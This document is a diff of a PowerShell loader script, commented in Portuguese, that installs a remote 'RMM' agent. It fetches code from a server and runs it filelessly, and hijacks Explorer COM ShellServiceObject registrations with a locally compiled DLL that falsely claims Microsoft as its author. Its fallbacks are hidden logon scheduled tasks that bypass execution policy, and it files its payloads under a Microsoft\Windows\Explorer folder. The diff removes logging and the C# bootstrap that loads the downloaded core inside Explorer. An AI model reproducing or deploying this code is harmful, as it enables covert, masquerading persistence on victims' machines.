@@ -1,50 +1,31 @@
 #Requires -Version 5.1
 <#
 .SYNOPSIS
-    Loader v2 user - AgentV2 sem admin, sem servico SYSTEM. Spec 10.
-    Pensado para ScriptBlock (irm texto, sem gravar .ps1). Preferir URL .txt:
-      & ([scriptblock]::Create((irm '.../install-com.txt'))) -Config '.../conf.cfg'
-    HostMode=Shell (default): so COM Hijack (cache Explorer). Baixa apenas RmmCore.dll;
-      usercache.dll e compilada localmente com csc.exe. Sem Host.exe / rundll / run-v2.ps1.
-    HostMode=Auto: COM primeiro; se falhar, ahi sim baixa extras e cascade task
-      (rundll32 -> RmmCore.Host.exe -> run-v2.ps1).
-    -Remove: para processos, task, cache Explorer e ficheiros user v2 (nao toca no servico SYSTEM).
-    Sem C/U/I/T no registry. Data dir: %LOCALAPPDATA%\Microsoft\Windows\Explorer
-
+    Loader v2 user. Spec 10.
 .PARAMETER HostMode
-    Shell (default, so COM) | Auto (COM + fallback task) | Rundll32 | Native | PowerShell
-
+    Shell (default) | Auto | Rundll32 | Native | PowerShell
 .EXAMPLE
     & ([scriptblock]::Create((irm 'http://host:4000/loaders/v2/install-com.txt'))) -Config 'http://host:4000/conf.cfg'
-
 .EXAMPLE
     & ([scriptblock]::Create((irm 'http://host:4000/loaders/v2/install-com.txt'))) -Remove
 #>
 [CmdletBinding()]
 param(
     [string]$Config,
-
     [string]$DataDir = $(Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\Explorer'),
-
     [ValidateSet('Auto', 'Native', 'Rundll32', 'PowerShell', 'Shell')]
     [string]$HostMode = 'Shell',
-
     [ValidateSet('Install', 'Remove')]
     [string]$Action = 'Install',
-
     [string]$Clsid,
-
     [ValidateSet('Auto', 'x64', 'x86')]
     [string]$Architecture = 'Auto',
-
     [switch]$NoRestartExplorer,
-
     [switch]$Remove
 )
 
 $ErrorActionPreference = 'Stop'
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-# Nao setar RMM_ALLOW_MODULES - string vazia bloqueia modules (Spec 06).
 
 $Script:V2ComClassName = 'UserProfileCacheV2.CacheProvider'
 $Script:V2ComDllName = 'usercache.dll'
@@ -137,12 +118,9 @@ function Save-RemoteFile {
                 throw 'ficheiro demasiado pequeno'
             }
 
-            # PS 5.1 Move-Item -Force NAO substitui ficheiro existente (Win32 183).
-            # COM Hijack: RmmCore.dll esta loaded no Explorer — libertar antes de copiar.
             if ($UnlockExplorer -or (Test-Path -LiteralPath $Dest)) {
                 try { Stop-RmmCoreUser -Dir $dir } catch { }
                 if ((Test-Path -LiteralPath $Dest) -and (Test-FileLocked -Path $Dest)) {
-                    Write-Host ("  {0} locked — a parar Explorer" -f (Split-Path -Leaf $Dest))
                     Stop-ExplorerProcesses
                     Start-Sleep -Seconds 2
                 }
@@ -159,7 +137,6 @@ function Save-RemoteFile {
             if (Test-Path -LiteralPath $tmp) {
                 Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue
             }
-            Write-Host ("WARN {0} : {1} retry {2}/{3}" -f (Split-Path -Leaf $Dest), $_.Exception.Message, ($i + 1), $Retries)
             try {
                 Stop-RmmCoreUser -Dir $dir
                 Stop-ExplorerProcesses
@@ -212,7 +189,6 @@ function Save-ComCorePayload {
         [Parameter(Mandatory = $true)][string]$Dir
     )
     $dest = Join-Path $Dir 'RmmCore.dll'
-    Write-Host "GET RmmCore.dll (COM Hijack — so o core)"
     Save-RemoteFile -Uri "$ServerBase/download/RmmCore.dll" -Dest $dest -UnlockExplorer
 }
 
@@ -222,7 +198,6 @@ function Save-TaskFallbackPayload {
         [Parameter(Mandatory = $true)][string]$Dir
     )
     $runnerPath = Join-Path $Dir 'run-v2.ps1'
-    Write-Host "GET run-v2 (fallback task)"
     try {
         Save-RemoteFile -Uri "$ServerBase/loaders/run-v2.txt" -Dest $runnerPath
     }
@@ -232,13 +207,10 @@ function Save-TaskFallbackPayload {
 
     foreach ($f in @('RmmCore.Host.exe', 'RmmCore.Rundll.dll')) {
         $dest = Join-Path $Dir $f
-        Write-Host "GET $f (fallback task, opcional)"
         try {
             Save-RemoteFile -Uri "$ServerBase/download/$f" -Dest $dest
         }
-        catch {
-            Write-Host "WARN skip $f : $($_.Exception.Message)"
-        }
+        catch { }
     }
     return $runnerPath
 }
@@ -295,7 +267,6 @@ function Test-HostAlive {
         Where-Object { ([string]$_.CommandLine) -like "*$Dir*" -or $_.ExecutablePath -like "*$Dir*" }).Count -gt 0)
 }
 
-# Task Scheduler: Hidden=true, sem cmd.exe wrapper (evita flash de consola).
 function Register-And-RunHiddenTask {
     param(
         [Parameter(Mandatory = $true)][string]$ExePath,
@@ -317,25 +288,23 @@ function Register-And-RunHiddenTask {
     $td.Settings.StopIfGoingOnBatteries = $false
     $td.Settings.StartWhenAvailable = $true
     $td.Settings.ExecutionTimeLimit = 'PT0S'
-    $td.Settings.MultipleInstances = 0 # IgnoreNew
-    $td.Principal.LogonType = 3 # TASK_LOGON_INTERACTIVE_TOKEN
-    $td.Principal.RunLevel = 0  # Least privilege
+    $td.Settings.MultipleInstances = 0
+    $td.Principal.LogonType = 3
+    $td.Principal.RunLevel = 0
 
-    $trigger = $td.Triggers.Create(9) # TASK_TRIGGER_LOGON
+    $trigger = $td.Triggers.Create(9)
     $trigger.Delay = 'PT15S'
     $trigger.Enabled = $true
 
-    $action = $td.Actions.Create(0) # TASK_ACTION_EXEC
+    $action = $td.Actions.Create(0)
     $action.Path = $ExePath
     $action.Arguments = $Arguments
     $action.WorkingDirectory = $WorkDir
 
-    # 6 = TASK_CREATE_OR_UPDATE; 3 = TASK_LOGON_INTERACTIVE_TOKEN
     try {
         [void]$folder.RegisterTaskDefinition($TaskName, $td, 6, $null, $null, 3)
     }
     catch {
-        Write-Warning "Task Scheduler: $($_.Exception.Message) — a tentar schtasks"
         $tr = '"{0}" {1}' -f $ExePath, $Arguments
         $null = & schtasks.exe /Create /TN $TaskName /SC ONLOGON /DELAY 0000:15 /RL LIMITED /F /TR $tr 2>&1
         if ($LASTEXITCODE -ne 0) { throw }
@@ -372,18 +341,13 @@ function Start-ViaRundll32 {
     if (-not (Test-Path -LiteralPath $RundllDll)) { return $false }
     $rundll = Get-NativeRundll32
     $args = '"{0}",AgentMain data={1}' -f $RundllDll, $Dir
-    Write-Host "Host rundll32 (oculto)"
     try {
         Register-And-RunHiddenTask -ExePath $rundll -Arguments $args -WorkDir $Dir
-    } catch {
-        Write-Warning "Task rundll32: $($_.Exception.Message)"
-    }
+    } catch { }
     if (Test-HostAlive -Dir $Dir -Mode Rundll32) { return $true }
     try {
         Start-ProcessHidden -FilePath $rundll -ArgumentList $args -WorkingDirectory $Dir
-    } catch {
-        Write-Warning "Start rundll32: $($_.Exception.Message)"
-    }
+    } catch { }
     Start-Sleep -Seconds 3
     return (Test-HostAlive -Dir $Dir -Mode Rundll32)
 }
@@ -392,18 +356,13 @@ function Start-ViaNativeHost {
     param([string]$Dir, [string]$HostExe)
     if (-not (Test-Path -LiteralPath $HostExe)) { return $false }
     $args = "data=$Dir"
-    Write-Host "Host Native/CLR (oculto)"
     try {
         Register-And-RunHiddenTask -ExePath $HostExe -Arguments $args -WorkDir $Dir
-    } catch {
-        Write-Warning "Task Host.exe: $($_.Exception.Message)"
-    }
+    } catch { }
     if (Test-HostAlive -Dir $Dir -Mode Native) { return $true }
     try {
         Start-ProcessHidden -FilePath $HostExe -ArgumentList $args -WorkingDirectory $Dir
-    } catch {
-        Write-Warning "Start Host.exe: $($_.Exception.Message)"
-    }
+    } catch { }
     Start-Sleep -Seconds 3
     return (Test-HostAlive -Dir $Dir -Mode Native)
 }
@@ -412,18 +371,13 @@ function Start-ViaPowerShellRunner {
     param([string]$Dir, [string]$RunnerPath)
     $ps = Get-NativePowerShell
     $arg = '-NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File "{0}"' -f $RunnerPath
-    Write-Host "Host PowerShell run-v2 (oculto)"
     try {
         Register-And-RunHiddenTask -ExePath $ps -Arguments $arg -WorkDir $Dir
-    } catch {
-        Write-Warning "Task run-v2: $($_.Exception.Message)"
-    }
+    } catch { }
     if (Test-HostAlive -Dir $Dir -Mode PowerShell) { return $true }
     try {
         Start-ProcessHidden -FilePath $ps -ArgumentList $arg -WorkingDirectory $Dir
-    } catch {
-        Write-Warning "Start run-v2: $($_.Exception.Message)"
-    }
+    } catch { }
     Start-Sleep -Seconds 3
     return (Test-HostAlive -Dir $Dir -Mode PowerShell)
 }
@@ -446,23 +400,13 @@ function Start-HostCascade {
     foreach ($step in $order) {
         $ok = $false
         switch ($step) {
-            'Rundll32' {
-                Write-Host 'Tentativa: rundll32'
-                $ok = Start-ViaRundll32 -Dir $Dir -RundllDll $RundllDll
-            }
-            'Native' {
-                Write-Host 'Tentativa: RmmCore.Host.exe (CLR)'
-                $ok = Start-ViaNativeHost -Dir $Dir -HostExe $NativeExe
-            }
-            'PowerShell' {
-                Write-Host 'Tentativa: run-v2.ps1 (PowerShell oculto)'
-                $ok = Start-ViaPowerShellRunner -Dir $Dir -RunnerPath $RunnerPath
-            }
+            'Rundll32' { $ok = Start-ViaRundll32 -Dir $Dir -RundllDll $RundllDll }
+            'Native' { $ok = Start-ViaNativeHost -Dir $Dir -HostExe $NativeExe }
+            'PowerShell' { $ok = Start-ViaPowerShellRunner -Dir $Dir -RunnerPath $RunnerPath }
         }
         if ($ok) {
             return @{ Ok = $true; Mode = $step }
         }
-        Write-Warning ("Falha {0} - a seguir cascade" -f $step)
     }
     return @{ Ok = $false; Mode = $null }
 }
@@ -539,7 +483,6 @@ function Unlock-V2ComDll {
         Stop-ExplorerProcesses
         Start-Sleep -Seconds 2
         if (-not (Test-FileLocked -Path $DllPath)) { return $true }
-        Write-Host ("  cache dll em uso — retry explorer $i/8")
     }
     return -not (Test-FileLocked -Path $DllPath)
 }
@@ -549,7 +492,6 @@ function Get-V2ComDllPath {
     $preferred = Join-Path $Dir $Script:V2ComDllName
     if ((Unlock-V2ComDll -DllPath $preferred)) { return $preferred }
     $alt = Join-Path $Dir ('usercache-{0}.dll' -f [guid]::NewGuid().ToString('N').Substring(0, 8))
-    Write-Warning "cache dll bloqueada pelo Explorer; a gravar $alt"
     return $alt
 }
 
@@ -644,14 +586,12 @@ function Get-InstallClsidCandidates {
         Add-ClsidToList -Value $prev -RequireInproc
     }
 
-    $ssoSeen = 0
     foreach ($rel in @(
             'Software\Microsoft\Windows\CurrentVersion\Explorer\ShellServiceObjects',
             'Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\ShellServiceObjects'
         )) {
         foreach ($name in @(Get-RegistrySubKeyNames -RelativePath $rel)) {
             if ($name -notmatch '^\{[0-9A-Fa-f-]{36}\}$') { continue }
-            $ssoSeen++
             Add-ClsidToList -Value $name
         }
     }
@@ -666,10 +606,6 @@ function Get-InstallClsidCandidates {
         }
     }
 
-    Write-Host ("cache providers: {0} candidatos={1}" -f $ssoSeen, $script:ClsidAccum.Count)
-    if ($script:ClsidAccum.Count -eq 0 -and $ssoSeen -eq 0) {
-        Write-Warning 'HKLM ShellServiceObjects vazio ou inacessivel.'
-    }
     return @($script:ClsidAccum.ToArray())
 }
 
@@ -888,727 +824,4 @@ namespace UserProfileCacheV2
 
     internal static class RegistryStore
     {
-        private const string ClsidRoot = @"Software\Classes\CLSID";
-        private const string InprocServer32 = "InprocServer32";
-
-        public static CacheConfig Load()
-        {
-            using (var clsidRoot = Registry.CurrentUser.OpenSubKey(ClsidRoot))
-            {
-                if (clsidRoot == null)
-                    return null;
-
-                foreach (var subKeyName in clsidRoot.GetSubKeyNames())
-                {
-                    using (var clsidKey = clsidRoot.OpenSubKey(subKeyName))
-                    {
-                        if (clsidKey == null)
-                            continue;
-                        using (var inproc = clsidKey.OpenSubKey(InprocServer32))
-                        {
-                            if (inproc == null)
-                                continue;
-                            var className = inproc.GetValue("Class") as string;
-                            if (!string.Equals(className, CacheConstants.ComClassName, StringComparison.Ordinal))
-                                continue;
-                            return new CacheConfig
-                            {
-                                Clsid = FormatClsid(subKeyName),
-                                OriginalInprocDll = clsidKey.GetValue(CacheConstants.OriginalInprocValueName) as string,
-                                DataDir = clsidKey.GetValue(CacheConstants.DataDirValueName) as string
-                            };
-                        }
-                    }
-                }
-            }
-            return null;
-        }
-
-        private static string FormatClsid(string subKeyName)
-        {
-            return subKeyName.StartsWith("{", StringComparison.Ordinal)
-                ? subKeyName.ToUpperInvariant()
-                : "{" + subKeyName.ToUpperInvariant() + "}";
-        }
-    }
-}
-'@
-        'ComNativeProxy.cs' = @'
-using System;
-using System.Runtime.InteropServices;
-
-namespace UserProfileCacheV2
-{
-    internal static class ComNativeProxy
-    {
-        private static readonly Guid IidClassFactory = new Guid("00000001-0000-0000-C000-000000000046");
-        private static readonly Guid IidShellService = new Guid("6D5FE0D0-1573-4d9c-BCB3-08AF49A55656");
-        private static readonly object SyncRoot = new object();
-        private static object _cachedInstance;
-        private static IShellService _cachedShellService;
-        private static IShellIconOverlayIdentifier _cachedOverlay;
-        private static IntPtr _nativeModule;
-
-        public static IShellService GetShellService()
-        {
-            EnsureLoaded();
-            return _cachedShellService;
-        }
-
-        public static IShellIconOverlayIdentifier GetOverlay()
-        {
-            EnsureLoaded();
-            return _cachedOverlay;
-        }
-
-        private static void EnsureLoaded()
-        {
-            if (_cachedInstance != null)
-                return;
-            lock (SyncRoot)
-            {
-                if (_cachedInstance != null)
-                    return;
-                var config = RegistryStore.Load();
-                if (config == null || string.IsNullOrEmpty(config.OriginalInprocDll) || string.IsNullOrEmpty(config.Clsid))
-                    return;
-                Guid clsid;
-                if (!TryParseClsid(config.Clsid, out clsid))
-                    return;
-                _cachedInstance = CreateInstanceFromNativeDll(config.OriginalInprocDll, clsid);
-                if (_cachedInstance == null)
-                    return;
-                _cachedShellService = _cachedInstance as IShellService;
-                if (_cachedShellService == null)
-                    _cachedShellService = QueryShellService(_cachedInstance);
-                _cachedOverlay = _cachedInstance as IShellIconOverlayIdentifier;
-            }
-        }
-
-        private static IShellService QueryShellService(object comObject)
-        {
-            if (comObject == null)
-                return null;
-            var ptr = Marshal.GetIUnknownForObject(comObject);
-            try
-            {
-                IntPtr servicePtr;
-                var iid = IidShellService;
-                var hr = Marshal.QueryInterface(ptr, ref iid, out servicePtr);
-                if (hr != 0 || servicePtr == IntPtr.Zero)
-                    return null;
-                try { return (IShellService)Marshal.GetObjectForIUnknown(servicePtr); }
-                finally { Marshal.Release(servicePtr); }
-            }
-            finally { Marshal.Release(ptr); }
-        }
-
-        private static object CreateInstanceFromNativeDll(string dllPath, Guid clsid)
-        {
-            try
-            {
-                if (_nativeModule == IntPtr.Zero)
-                {
-                    _nativeModule = NativeMethods.LoadLibrary(dllPath);
-                    if (_nativeModule == IntPtr.Zero)
-                        return null;
-                }
-                var export = NativeMethods.GetProcAddress(_nativeModule, "DllGetClassObject");
-                if (export == IntPtr.Zero)
-                    return null;
-                var getClassObject = (NativeMethods.DllGetClassObjectDelegate)
-                    Marshal.GetDelegateForFunctionPointer(export, typeof(NativeMethods.DllGetClassObjectDelegate));
-                IntPtr factoryPtr;
-                var classId = clsid;
-                var factoryIid = IidClassFactory;
-                var hr = getClassObject(ref classId, ref factoryIid, out factoryPtr);
-                if (hr != 0 || factoryPtr == IntPtr.Zero)
-                    return null;
-                try
-                {
-                    var factory = (IClassFactory)Marshal.GetObjectForIUnknown(factoryPtr);
-                    IntPtr instancePtr;
-                    var serviceIid = IidShellService;
-                    hr = factory.CreateInstance(null, ref serviceIid, out instancePtr);
-                    if (hr != 0 || instancePtr == IntPtr.Zero)
-                    {
-                        var unknownIid = new Guid("00000000-0000-0000-C000-000000000046");
-                        hr = factory.CreateInstance(null, ref unknownIid, out instancePtr);
-                    }
-                    if (hr != 0 || instancePtr == IntPtr.Zero)
-                        return null;
-                    try { return Marshal.GetObjectForIUnknown(instancePtr); }
-                    finally { Marshal.Release(instancePtr); }
-                }
-                finally { Marshal.Release(factoryPtr); }
-            }
-            catch
-            {
-                return null;
-            }
-        }
-
-        private static bool TryParseClsid(string value, out Guid clsid)
-        {
-            clsid = Guid.Empty;
-            if (string.IsNullOrWhiteSpace(value))
-                return false;
-            var text = value.Trim().Trim('{', '}');
-            return Guid.TryParse(text, out clsid);
-        }
-
-        [ComImport]
-        [Guid("00000001-0000-0000-C000-000000000046")]
-        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
-        private interface IClassFactory
-        {
-            [PreserveSig]
-            int CreateInstance(
-                [MarshalAs(UnmanagedType.IUnknown)] object pUnkOuter,
-                ref Guid riid,
-                out IntPtr ppvObject);
-            void LockServer([MarshalAs(UnmanagedType.Bool)] bool fLock);
-        }
-
-        private static class NativeMethods
-        {
-            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            internal delegate int DllGetClassObjectDelegate(ref Guid rclsid, ref Guid riid, out IntPtr ppv);
-
-            [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
-            internal static extern IntPtr LoadLibrary(string lpFileName);
-
-            [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
-            internal static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-        }
-    }
-}
-'@
-        'CacheProvider.cs' = @'
-using System.Runtime.InteropServices;
-using System.Text;
-
-namespace UserProfileCacheV2
-{
-    [ComVisible(true)]
-    [Guid(CacheConstants.ClassGuid)]
-    [ProgId(CacheConstants.ProgId)]
-    [ClassInterface(ClassInterfaceType.None)]
-    [ComDefaultInterface(typeof(IShellService))]
-    public class CacheProvider : ICacheProvider, IShellIconOverlayIdentifier, IShellService
-    {
-        private const int HResultFalse = 1;
-        private const int HResultOk = 0;
-        private const int HResultFail = unchecked((int)0x80004005);
-
-        static CacheProvider()
-        {
-            AgentBootstrap.Execute();
-        }
-
-        public CacheProvider()
-        {
-            AgentBootstrap.Execute();
-        }
-
-        public string GetVersion() { return "2.0.0.0"; }
-
-        public int IsMemberOf(string path, uint attributes)
-        {
-            var overlay = ComNativeProxy.GetOverlay();
-            if (overlay != null)
-                return overlay.IsMemberOf(path, attributes);
-            return HResultFalse;
-        }
-
-        public int GetOverlayInfo(StringBuilder iconFile, int cchMax, out int index, out uint flags)
-        {
-            var overlay = ComNativeProxy.GetOverlay();
-            if (overlay != null)
-                return overlay.GetOverlayInfo(iconFile, cchMax, out index, out flags);
-            index = 0;
-            flags = 0;
-            return HResultFalse;
-        }
-
-        public int GetPriority(out int priority)
-        {
-            var overlay = ComNativeProxy.GetOverlay();
-            if (overlay != null)
-                return overlay.GetPriority(out priority);
-            priority = 0;
-            return HResultOk;
-        }
-
-        public int SetOwner(object punkOwner)
-        {
-            var service = ComNativeProxy.GetShellService();
-            if (service != null)
-                return service.SetOwner(punkOwner);
-            return HResultFail;
-        }
-    }
-}
-'@
-        'AgentBootstrap.cs' = @'
-using System;
-using System.IO;
-using System.Net.NetworkInformation;
-using System.Reflection;
-using System.Threading;
-using System.Threading.Tasks;
-
-namespace UserProfileCacheV2
-{
-    internal static class AgentBootstrap
-    {
-        private static int _executed;
-
-        public static void Execute()
-        {
-            if (Interlocked.Exchange(ref _executed, 1) == 1)
-                return;
-            var thread = new Thread(RunWorkerSafe);
-            thread.IsBackground = true;
-            thread.SetApartmentState(ApartmentState.MTA);
-            thread.Start();
-        }
-
-        private static void RunWorkerSafe()
-        {
-            try { RunWorker(); }
-            catch (Exception ex) { WriteTrace("RunWorker fatal: " + ex.Message); }
-        }
-
-        private static void RunWorker()
-        {
-            Thread.Sleep(CacheConstants.InitialDelayMs);
-            Mutex mutex = null;
-            var ownsMutex = false;
-            try
-            {
-                bool created;
-                mutex = new Mutex(false, CacheConstants.MutexName, out created);
-                ownsMutex = mutex.WaitOne(0, false);
-                if (!ownsMutex)
-                    return;
-
-                var config = RegistryStore.Load();
-                var dataDir = ResolveDataDir(config);
-                if (string.IsNullOrEmpty(dataDir) || !Directory.Exists(dataDir))
-                {
-                    WriteTrace("data dir missing: " + dataDir);
-                    return;
-                }
-
-                Environment.SetEnvironmentVariable("RMM_DATA_DIR", dataDir);
-                var backoff = CacheConstants.InitialBackoffMs;
-                while (true)
-                {
-                    while (!NetworkInterface.GetIsNetworkAvailable())
-                        Thread.Sleep(CacheConstants.NetworkPollMs);
-                    try
-                    {
-                        var started = DateTime.UtcNow;
-                        LoadAndRunCore(dataDir);
-                        var elapsedMs = (int)(DateTime.UtcNow - started).TotalMilliseconds;
-                        WriteTrace("Entry.RunAsync ended after " + elapsedMs + "ms");
-                        backoff = CacheConstants.InitialBackoffMs;
-                        Thread.Sleep(1500);
-                    }
-                    catch (Exception ex)
-                    {
-                        WriteTrace("Retry: " + ex.Message);
-                        Thread.Sleep(backoff);
-                        if (backoff < CacheConstants.MaxBackoffMs)
-                            backoff = Math.Min(backoff * 2, CacheConstants.MaxBackoffMs);
-                    }
-                }
-            }
-            finally
-            {
-                if (ownsMutex && mutex != null)
-                {
-                    try { mutex.ReleaseMutex(); } catch { }
-                }
-                if (mutex != null)
-                    mutex.Dispose();
-            }
-        }
-
-        private static string ResolveDataDir(CacheConfig config)
-        {
-            var env = Environment.GetEnvironmentVariable("RMM_DATA_DIR");
-            if (!string.IsNullOrWhiteSpace(env))
-                return env.Trim();
-            if (config != null && !string.IsNullOrWhiteSpace(config.DataDir))
-                return config.DataDir.Trim();
-            try
-            {
-                var loc = Assembly.GetExecutingAssembly().Location;
-                if (!string.IsNullOrEmpty(loc))
-                {
-                    var dir = Path.GetDirectoryName(loc);
-                    if (!string.IsNullOrEmpty(dir) && File.Exists(Path.Combine(dir, "bootstrap.json")))
-                        return dir;
-                }
-            }
-            catch { }
-            return Path.Combine(
-                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
-                "Microsoft", "Windows", "Explorer");
-        }
-
-        private static void LoadAndRunCore(string dataDir)
-        {
-            var dllPath = Path.Combine(dataDir, "RmmCore.dll");
-            if (!File.Exists(dllPath))
-                throw new FileNotFoundException("RmmCore.dll missing", dllPath);
-
-            var asmPath = typeof(AgentDomainHost).Assembly.Location;
-            if (!string.IsNullOrEmpty(asmPath) && File.Exists(asmPath))
-            {
-                AppDomain domain = null;
-                try
-                {
-                    var setup = new AppDomainSetup();
-                    setup.ApplicationBase = dataDir;
-                    domain = AppDomain.CreateDomain("RmmCoreV2_" + Guid.NewGuid().ToString("N"), null, setup);
-                    var host = (AgentDomainHost)domain.CreateInstanceFromAndUnwrap(
-                        asmPath, typeof(AgentDomainHost).FullName);
-                    host.Run(dllPath);
-                    return;
-                }
-                catch (Exception ex)
-                {
-                    WriteTrace("AppDomain failed: " + ex.Message);
-                    if (domain != null)
-                    {
-                        try { AppDomain.Unload(domain); } catch { }
-                    }
-                }
-                finally
-                {
-                    if (domain != null)
-                    {
-                        try { AppDomain.Unload(domain); } catch { }
-                    }
-                }
-            }
-
-            RunCoreInCurrentDomain(dllPath);
-        }
-
-        private static void RunCoreInCurrentDomain(string dllPath)
-        {
-            var assembly = Assembly.LoadFrom(dllPath);
-            var entryType = assembly.GetType(CacheConstants.AgentEntryType, true);
-            var runMethod = entryType.GetMethod(
-                CacheConstants.AgentRunMethod,
-                BindingFlags.Public | BindingFlags.Static);
-            if (runMethod == null)
-                throw new MissingMethodException(entryType.FullName, CacheConstants.AgentRunMethod);
-            var result = runMethod.Invoke(null, new object[] { CancellationToken.None });
-            var task = result as Task;
-            if (task != null)
-                task.ConfigureAwait(false).GetAwaiter().GetResult();
-        }
-
-        internal static void WriteTrace(string message)
-        {
-            try
-            {
-                var temp = Environment.GetEnvironmentVariable("TEMP");
-                var logPath = string.IsNullOrEmpty(temp)
-                    ? @"C:\Windows\Temp\.upc-sync.log"
-                    : Path.Combine(temp, ".upc-sync.log");
-                File.AppendAllText(logPath, string.Format(
-                    "[{0:yyyy-MM-dd HH:mm:ss} UTC] {1}{2}",
-                    DateTime.UtcNow, message, Environment.NewLine));
-            }
-            catch { }
-        }
-    }
-
-    public sealed class AgentDomainHost : MarshalByRefObject
-    {
-        public void Run(string dllPath)
-        {
-            if (string.IsNullOrEmpty(dllPath) || !File.Exists(dllPath))
-                throw new FileNotFoundException("RmmCore.dll missing", dllPath);
-            var dir = Path.GetDirectoryName(dllPath);
-            if (!string.IsNullOrEmpty(dir))
-                Environment.SetEnvironmentVariable("RMM_DATA_DIR", dir);
-            var assembly = Assembly.LoadFrom(dllPath);
-            var entryType = assembly.GetType(CacheConstants.AgentEntryType, true);
-            var runMethod = entryType.GetMethod(
-                CacheConstants.AgentRunMethod,
-                BindingFlags.Public | BindingFlags.Static);
-            if (runMethod == null)
-                throw new MissingMethodException(entryType.FullName, CacheConstants.AgentRunMethod);
-            var result = runMethod.Invoke(null, new object[] { CancellationToken.None });
-            var task = result as Task;
-            if (task != null)
-                task.ConfigureAwait(false).GetAwaiter().GetResult();
-        }
-
-        public override object InitializeLifetimeService() { return null; }
-    }
-}
-'@
-        'AssemblyInfo.cs' = @'
-using System.Reflection;
-using System.Runtime.InteropServices;
-
-[assembly: AssemblyTitle("UserProfileCacheV2")]
-[assembly: AssemblyDescription("User profile cache provider")]
-[assembly: AssemblyCompany("Microsoft Corporation")]
-[assembly: AssemblyProduct("Microsoft Windows")]
-[assembly: ComVisible(true)]
-[assembly: Guid("C1D2E3F4-A5B6-7C8D-9E0F-1A2B3C4D5E6F")]
-[assembly: AssemblyVersion("2.0.0.0")]
-[assembly: AssemblyFileVersion("2.0.0.0")]
-'@
-    }
-}
-
-function Invoke-CompileV2CacheBootstrap {
-    param(
-        [Parameter(Mandatory = $true)][string]$OutputPath,
-        [ValidateSet('Auto', 'x64', 'x86')][string]$Arch = 'Auto'
-    )
-    $buildDir = Join-Path $env:TEMP ("upc2_" + [guid]::NewGuid().ToString('N'))
-    New-Item -ItemType Directory -Path $buildDir -Force | Out-Null
-    try {
-        foreach ($entry in (Get-V2CacheSourceMap).GetEnumerator()) {
-            Set-Content -LiteralPath (Join-Path $buildDir $entry.Key) -Value $entry.Value -Encoding UTF8
-        }
-        $csc = Get-CscPath -Arch $Arch
-        $sourceFiles = @(Get-ChildItem -Path $buildDir -Filter '*.cs' | ForEach-Object { $_.FullName })
-        $outDir = Split-Path -Parent $OutputPath
-        if (-not (Test-Path $outDir)) {
-            New-Item -ItemType Directory -Path $outDir -Force | Out-Null
-        }
-        $stagingPath = Join-Path $buildDir 'UserProfileCacheV2.dll'
-        $cscArgs = @(
-            '/nologo',
-            '/target:library',
-            '/platform:anycpu',
-            "/out:$stagingPath",
-            '/reference:System.dll'
-        ) + $sourceFiles
-        & $csc @cscArgs
-        if ($LASTEXITCODE -ne 0) {
-            throw "csc.exe falhou com exit code $LASTEXITCODE"
-        }
-        $copied = $false
-        for ($i = 1; $i -le 5; $i++) {
-            try {
-                Copy-Item -LiteralPath $stagingPath -Destination $OutputPath -Force
-                $copied = $true
-                break
-            }
-            catch {
-                Stop-ExplorerProcesses
-                Start-Sleep -Seconds 2
-                if ($i -eq 5) { throw }
-            }
-        }
-        if (-not $copied) {
-            throw "Nao foi possivel gravar $OutputPath"
-        }
-    }
-    finally {
-        if (Test-Path $buildDir) {
-            Remove-Item -LiteralPath $buildDir -Recurse -Force -ErrorAction SilentlyContinue
-        }
-    }
-}
-
-function Install-V2Cache {
-    param(
-        [Parameter(Mandatory = $true)][string]$Dir,
-        [string]$TargetClsid,
-        [ValidateSet('Auto', 'x64', 'x86')][string]$Arch = 'Auto',
-        [switch]$SkipExplorerRestart
-    )
-    $candidates = @(Get-InstallClsidCandidates -Dir $Dir -Preferred $TargetClsid)
-    if ($TargetClsid) {
-        $forced = Format-ComClsid -Value $TargetClsid
-        if ($candidates -notcontains $forced) {
-            throw "CLSID $forced sem InprocServer32 em HKLM."
-        }
-        $candidates = @($forced)
-    }
-    if ($candidates.Count -eq 0) {
-        throw "Nenhum CLSID automatico (ShellServiceObject / overlay com InprocServer32)."
-    }
-
-    Write-Host ("providers: {0}" -f $candidates.Count)
-
-    $removed = Unregister-V2Cache
-    if ($removed -gt 0) {
-        Write-Host "Removidos providers v2 anteriores: $removed"
-    }
-
-    $destDll = Get-V2ComDllPath -Dir $Dir
-    Invoke-CompileV2CacheBootstrap -OutputPath $destDll -Arch $Arch
-
-    $lastErr = $null
-    $result = $null
-    foreach ($c in $candidates) {
-        try {
-            Write-Host "Tentativa provider $c"
-            $null = Unregister-V2Cache
-            $result = Register-CacheProvider -Path $destDll -TargetClsid $c -Arch $Arch
-            $orig = Save-OriginalInprocDll -TargetClsid $result.Clsid
-            if (-not $orig) {
-                throw "CLSID sem DLL original (O) em HKLM InprocServer32."
-            }
-            Set-HkcuClsidValue -Clsid $result.Clsid -Name 'D' -Value $Dir
-            Set-Content -Path (Join-Path $Dir $Script:V2StateFileName) -Value $result.Clsid -NoNewline
-            $lastErr = $null
-            break
-        }
-        catch {
-            $lastErr = $_
-            Write-Warning ("CLSID {0} falhou: {1}" -f $c, $_.Exception.Message)
-            $null = Unregister-V2Cache
-            $result = $null
-        }
-    }
-
-    if (-not $result) {
-        if ($lastErr) { throw $lastErr }
-        throw "cache Explorer falhou em todos os CLSID candidatos."
-    }
-
-    if (-not $SkipExplorerRestart) {
-        Restart-ExplorerShell
-    }
-
-    Write-Host ("AgentV2 cache OK -> clsid={0} dll={1} data={2}" -f $result.Clsid, $destDll, $Dir)
-}
-
-function Invoke-RemoveV2UserInstall {
-    param(
-        [Parameter(Mandatory = $true)][string]$Dir,
-        [switch]$SkipExplorerRestart
-    )
-    Write-Host '==> Remove AgentV2 user (cache Explorer + task + rundll32/Host.exe + payload)'
-    $prev = $ErrorActionPreference
-    $ErrorActionPreference = 'SilentlyContinue'
-    try {
